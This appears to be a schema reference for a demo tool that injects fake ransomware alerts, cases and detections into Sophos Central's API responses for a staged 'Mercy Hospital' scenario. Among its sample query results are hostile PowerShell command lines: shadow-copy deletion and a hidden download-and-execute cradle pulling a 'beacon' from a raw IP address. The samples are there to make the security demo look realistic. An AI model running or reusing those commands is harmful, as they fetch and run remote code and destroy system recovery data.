# Sophos Demo Scenario Schema

A scenario JSON file defines what fake data to inject into Sophos Central's API responses.

## Top-Level Structure

```json
{
  "id": "ransomware-lockbit-mercy",
  "name": "LockBit Ransomware — Mercy Hospital",
  "description": "LockBit 3.0 ransomware via phishing email to billing dept...",
  "version": 1,
  "createdAt": "2026-03-23T...",

  "customer": {
    "name": "Mercy Hospital",
    "industry": "healthcare",
    "endpointCount": 4200,
    "serverCount": 300
  },

  "alerts": { ... },
  "alertSummary": { ... },
  "cases": { ... },
  "detections": { ... },
  "billing": { ... },
  "user": { ... },
  "healthScore": { ... },
  "endpointReport": { ... },
  "emailStats": { ... },
  "attacks": { ... }
}
```

## Section Details

### alerts
Controls `/api/alerts/retrieve` response.

- `mode`: `"prepend"` (add to real alerts) or `"override"` (replace entirely)
- `items`: Array of alert objects (see shape below)
- `summaryDelta`: `{ "high": N, "medium": N, "low": N }` — added to real summary counts

**Alert Object Shape:**
```json
{
  "javaUUID": "auto",
  "product": "endpoint|firewall|xgemail",
  "threat": "Troj/Ransom-GKL",
  "threat_cleanable": true,
  "event_service_event_id": "auto",
  "customer_id": "auto",
  "created_at": "-3m",
  "severity": "high|medium|low",
  "actionable": true,
  "category": "malware|runtime_detections|policy|connectivity",
  "when": "-3m",
  "allowedActions": ["CLEAN", "ACKNOWLEDGE"],
  "location": "DESKTOP-FIN042",
  "id": "auto",
  "type": "Event::Endpoint::Threat::CleanupFailed::KillFailed",
  "source": null,
  "data": {
    "created_at": "-3m",
    "endpoint_id": "auto",
    "endpoint_type": "computer|server|utm|email",
    "endpoint_platform": "windows|linux|macos|unknown"
  },
  "description": "Ransomware detected: 'Troj/Ransom-GKL' at 'C:\\...'",
  "info": "Manual cleanup required"
}
```

### cases
Controls `/cases/v1/cases` response.

- `mode`: `"prepend"` or `"override"`
- `items`: Array of case objects

**Case Object Shape:**
```json
{
  "id": "auto",
  "type": "investigation",
  "name": "(DESKTOP-FIN042) | Ransomware Attack — Mercy Hospital",
  "tenant": { "id": "auto" },
  "managedBy": "self|mtr",
  "createdAt": "-3m",
  "createdBy": { "name": "Auto-generated|Sophos MDR Team" },
  "updatedAt": "-1m",
  "status": "new|investigating|containment|resolved|closed",
  "initialDetection": {
    "id": "auto",
    "severity": 9,
    "type": "Threat",
    "detectionRule": "WIN-IMP-PRC-SHADOWCOPY-SELECT-DELETE-RESIZE-1",
    "mitreAttacks": [
      {
        "tactic": {
          "id": "TA0002",
          "name": "Execution",
          "techniques": [
            { "id": "T1059.001", "name": "PowerShell" }
          ]
        }
      }
    ],
    "time": "-3m",
    "sensor": { "type": "endpoint", "source": "Sophos Endpoint" }
  },
  "assignee": { "name": "SOC Analyst|Sophos MDR Team|Unassigned" },
  "overview": "Free text description of the case...",
  "detectionCount": 24,
  "escalated": true
}
```

### detections
Controls `/detections/queries/.../results` response.

- `mode`: `"prepend"` or `"override"`
- `items`: Array of detection objects

**Detection Object Shape:**
```json
{
  "id": "auto",
  "detectionCreatedAt": "-3m",
  "connectorGeneratedAt": "-3m",
  "connector": {
    "id": "SophosSensorID",
    "type": "endpoint",
    "vendor": "Sophos",
    "version": "SED Driver 4.2.1"
  },
  "device": {
    "id": "auto",
    "type": "computer|server",
    "hostname": "DESKTOP-FIN042"
  },
  "rawData": {
    "meta_hostname": "DESKTOP-FIN042",
    "meta_ip_address": "192.168.1.42",
    "meta_os_name": "Microsoft Windows 11 Enterprise",
    "meta_username": "sarah.chen",
    "cmdline": "powershell.exe -ExecutionPolicy Bypass ...",
    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "parent_name": "invoice_march2026.exe",
    "sha256": "a1b2c3..."
  },
  "risk": 9,
  "category": "Threat",
  "classificationRule": "WIN-IMP-PRC-SHADOWCOPY-SELECT-DELETE-RESIZE-1",
  "ruleDescription": "Shadow copy deletion detected",
  "mitreAttacks": [
    {
      "tactic": {
        "id": "TA0040",
        "name": "Impact",
        "techniques": [{ "id": "T1490", "name": "Inhibit System Recovery" }]
      }
    }
  ],
  "attackType": "Ransomware|Exploit|C2|Phishing",
  "severity": 9,
  "detectionAttack": { "id": "auto", "name": "Ransomware Kill Chain" },
  "detectionLicenses": ["XDR"],
  "geolocation": {},
  "intelixFileReputation": { "score": 100, "label": "Known Malicious" },
  "detectionType": "Threat",
  "suppressed": false,
  "caseDescription": "Active ransomware attack"
}
```

### caseDetail
Controls case detail sub-pages when an SE clicks into a case.

- `activities`: Override for `/cases/v1/cases/{id}/activities` — case timeline
- `extraActivities`: Array of additional activity items to append (auto-generates base activities from case data)
- `mitreSummary`: Override for `/cases/v1/cases/{id}/mitre-attack-summary`
- `impactedEntities`: Override for `/cases/v1/cases/{id}/impacted-entities`
- `notebook`: Override for `/cases/v1/cases/{id}/notebook/sections`
- `responseActions`: Override for `/xdr-actions/v1/actions`
- `actionRuns`: Override for `/xdr-actions/v1/actions/runs`

**Activity Object Shape:**
```json
{
  "userName": "Sophos MDR Team",
  "action": "Device DESKTOP-FIN042 isolated from network",
  "category": "caseActivity",
  "createdAt": "-2m"
}
```

**Impacted Entities Shape:**
```json
{
  "items": [
    {
      "id": "auto",
      "name": "DESKTOP-FIN042",
      "type": "device",
      "detections": [
        { "id": "auto", "detectionRule": "WIN-IMP-PRC-SHADOWCOPY-SELECT-DELETE-RESIZE-1" }
      ]
    },
    {
      "id": "auto",
      "name": "192.168.1.42",
      "type": "ip_address",
      "detections": []
    }
  ],
  "pages": { "current": 1, "size": 50, "total": 1, "items": 2 }
}
```

**Note:** If `caseDetail` sections are omitted, the interceptor auto-generates:
- Activities from case creation info + MDR actions (if `managedBy: "mtr"`)
- MITRE summary from case's `initialDetection.mitreAttacks`
- Impacted entities from detection device hostnames and IPs

### threatGraphs
Controls Threat Analysis Center → Threat Graphs pages.

- `stacCases`: Override for `/api/stac/cases` — threat graph case list
- `stacCaseDetail`: Override for `/api/stac/cases/{id}` — single threat graph case
- `graph`: Override for `/api/stac/rootcause/{id}/graph` — the visual kill chain data
- `artifacts`: Override for `/api/stac/rootcause/{id}/artifacts`

**STAC Case Shape:**
```json
{
  "summary": { "closed": 0, "inprogress": 1, "total": 1, "new": 0 },
  "items": [
    {
      "endpointId": "auto",
      "endpointType": "computer",
      "endpointName": "DESKTOP-FIN042",
      "username": "{{customerDomain}}\\sarah.chen",
      "rootCauseName": "invoice_march2026.exe",
      "malwareName": "Troj/Ransom-GKL",
      "cloudCreatedAt": "-3m",
      "rootCauseDT": "-5m",
      "status": "NEW",
      "priority": "HIGH",
      "id": "auto",
      "caseType": "SYSTEM_GENERATED",
      "suspectProcessCount": 4
    }
  ],
  "total": 1,
  "filtered": 1,
  "nextKey": null
}
```

### billing
Controls `/api/billing/account` response.
```json
{
  "overrideName": "Mercy Hospital",
  "overrideAlias": "Mercy Hospital Inc."
}
```

### user
Controls `/api/users/current` response.
```json
{
  "overrideCompany": "Mercy Hospital",
  "overrideAlias": "Mercy Hospital Inc."
}
```

### healthScore
Controls `/account-health-check/v1/scores` response.
```json
{
  "override": 72
}
```

### endpointReport
Controls `/api/reports/endpoints` response.
```json
{
  "overrideTotal": 4200,
  "overrideSummary": {
    "total": 4200,
    "active": 3654,
    "unprotected": 1,
    "inactive": 126,
    "dormant": 419
  }
}
```

### emailStats
Controls `/email/v1/statistics/dashboard/widget` response.
```json
{
  "override": [
    { "name": "POTENTIAL_THREATS", "value": 47 },
    { "name": "INBOUND_MAILS_SCANNED", "value": 1284 },
    { "name": "MALICIOUS_URL", "value": 47 },
    { "name": "SPAM", "value": 89 },
    { "name": "LEGITIMATE", "value": 784 }
  ]
}
```

### attacks
Controls `/ews-query/v1/attacks` response.
```json
{
  "override": { "items": [] }
}
```

### auditLogs
Controls audit log pages (`/api/audit/logs`, `/api/logs/audit`).

- `mode`: `"prepend"` (add to real logs) or `"override"` (replace entirely)
- `items`: Array of audit log entries

**Audit Log Entry Shape:**
```json
{
  "id": "auto",
  "timestamp": "-15m",
  "type": "admin_action",
  "category": "endpoint",
  "action": "Device isolated from network",
  "actor": "Sophos MDR Team",
  "actorType": "admin",
  "target": "DESKTOP-FIN042",
  "targetType": "endpoint",
  "result": "success",
  "description": "MDR team isolated DESKTOP-FIN042 following ransomware detection. Network access revoked pending forensic analysis.",
  "ipAddress": "10.0.0.1",
  "data": {}
}
```

### liveDiscover
Controls Live Discover / XDR query pages.

- `savedQueries`: Override for query catalog / saved queries list
- `queryResults`: Override for query execution results
- `connectedEndpoints`: Override for available endpoints to query

**Query Results Shape:**
```json
{
  "id": "auto",
  "status": "completed",
  "query": "SELECT pid, name, path, cmdline FROM processes WHERE name LIKE '%powershell%'",
  "queryName": "Suspicious PowerShell Processes",
  "startedAt": "-2m",
  "completedAt": "-1m",
  "endpointsQueried": 5,
  "endpointsResponded": 5,
  "totalResults": 3,
  "columns": [
    { "name": "pid", "type": "INTEGER" },
    { "name": "name", "type": "TEXT" },
    { "name": "path", "type": "TEXT" },
    { "name": "cmdline", "type": "TEXT" },
    { "name": "endpoint_hostname", "type": "TEXT" }
  ],
  "rows": [
    [12028, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ExecutionPolicy Bypass -C \"vssadmin delete shadows\"", "DESKTOP-FIN042"],
    [8844, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ep bypass -file C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\update.ps1", "DESKTOP-FIN042"],
    [3392, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://45.33.49.12/beacon')\"", "DESKTOP-FIN042"]
  ]
}
```

**Saved Queries Shape:**
```json
{
  "items": [
    {
      "id": "auto",
      "name": "Suspicious PowerShell Processes",
      "description": "Find PowerShell processes with suspicious command lines",
      "category": "threat-hunting",
      "query": "SELECT pid, name, path, cmdline FROM processes WHERE name LIKE '%powershell%'",
      "createdBy": "Sophos",
      "isBuiltIn": true
    }
  ],
  "pages": { "current": 1, "size": 50, "total": 1, "items": 1 }
}
```

### emailHistory
Controls email message history and quarantine pages.

- `messages`: Override for message search / history list
- `quarantine`: Override for quarantined messages list
- `messageDetail`: Override for individual message trace

**Email Message Shape:**
```json
{
  "items": [
    {
      "id": "auto",
      "timestamp": "-8m",
      "direction": "INBOUND",
      "from": "attacker@secure-login-verify.com",
      "to": "sarah.chen@{{customerDomain}}",
      "subject": "Action Required: Verify Your Account",
      "status": "BLOCKED",
      "reason": "MALICIOUS_URL",
      "size": 45678,
      "attachments": 0,
      "urls": ["https://secure-login-verify.com/portal/login.php"],
      "scanResults": {
        "spamScore": 95,
        "phishingScore": 99,
        "malwareDetected": false,
        "urlRewrite": true,
        "sandboxResult": "MALICIOUS"
      }
    }
  ],
  "total": 47,
  "filtered": 47,
  "pages": { "current": 1, "size": 20, "total": 3, "items": 47 }
}
```

## Timestamp Shortcuts

Instead of ISO timestamps, use relative shorthand. The extension resolves them at runtime:

| Shorthand | Meaning |
|-----------|---------|
| `-3m`     | 3 minutes ago |
| `-2h`     | 2 hours ago |
| `-1d`     | 1 day ago |
| `now`     | current time |

## Auto-Generated Fields

Fields marked `"auto"` are generated at runtime:
- UUIDs (javaUUID, id, endpoint_id, tenant.id, etc.)
- Case IDs (format: `1-NNNNNNN`)
- Detection IDs (format: `sha256_sha1`)
